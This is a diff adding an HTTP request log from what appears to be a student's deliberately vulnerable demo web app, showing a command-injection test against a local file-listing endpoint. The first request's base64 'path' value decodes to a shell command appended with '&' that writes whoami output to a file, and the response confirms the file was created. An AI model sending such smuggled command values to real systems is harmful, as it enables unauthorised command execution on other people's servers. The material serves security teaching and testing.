@@ -1,0 +1,54 @@
+GET http://localhost:8080/command-injection/files?path=JiB3aG9hbUkgPiBteUZJbGVZSE4udHh0
+
+HTTP/1.1 200
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 08 Apr 2023 08:48:34 GMT
+Keep-Alive: timeout=60
+Connection: keep-alive
+
+{
+  "path": "C:\\Users\\Yalchan Niyaziev\\Documents\\yhn_projects\\Master_CyberSecurity\\web-app-security-vulnerabilities-demonstration-app\\target\\classes\\profile",
+  "files": [
+    {
+      "fileName": "documents",
+      "isDirectory": true
+    },
+    {
+      "fileName": "images",
+      "isDirectory": true
+    },
+    {
+      "fileName": "myFIleYHN.txt",
+      "isDirectory": false
+    },
+    {
+      "fileName": "user-data.txt",
+      "isDirectory": false
+    }
+  ]
+}
+
+Response code: 200; Time: 141ms; Content length: 356 bytes
+
+
+GET http://localhost:8080/command-injection/files?path=ZG9jdW1lbnRz
+
+HTTP/1.1 200
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 08 Apr 2023 08:51:25 GMT
+Keep-Alive: timeout=60
+Connection: keep-alive
+
+{
+  "path": "C:\\Users\\Yalchan Niyaziev\\Documents\\yhn_projects\\Master_CyberSecurity\\web-app-security-vulnerabilities-demonstration-app\\target\\classes\\profile\\documents",
+  "files": [
+    {
+      "fileName": "privacy_policy.pdf",
+      "isDirectory": false
+    }
+  ]
+}
+
+Response code: 200; Time: 150ms; Content length: 238 bytes
